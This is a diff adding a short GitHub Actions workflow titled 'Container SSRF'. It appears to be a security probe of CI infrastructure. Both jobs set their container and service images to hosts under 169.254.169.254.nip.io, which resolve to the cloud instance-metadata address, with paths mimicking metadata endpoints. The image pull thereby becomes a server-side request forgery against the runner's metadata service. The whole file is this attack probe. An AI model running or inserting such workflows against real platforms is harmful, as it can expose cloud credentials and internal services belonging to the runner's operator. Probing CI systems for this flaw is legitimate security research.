@@ -1,0 +1,16 @@
+name: Container SSRF
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    container:
+      image: 169.254.169.254.nip.io/metadata/instance:latest
+    steps:
+      - run: echo "test"
+  test2:
+    runs-on: ubuntu-latest
+    services:
+      ssrf-svc:
+        image: 169.254.169.254.nip.io/latest/meta-data:latest
+    steps:
+      - run: echo "test"
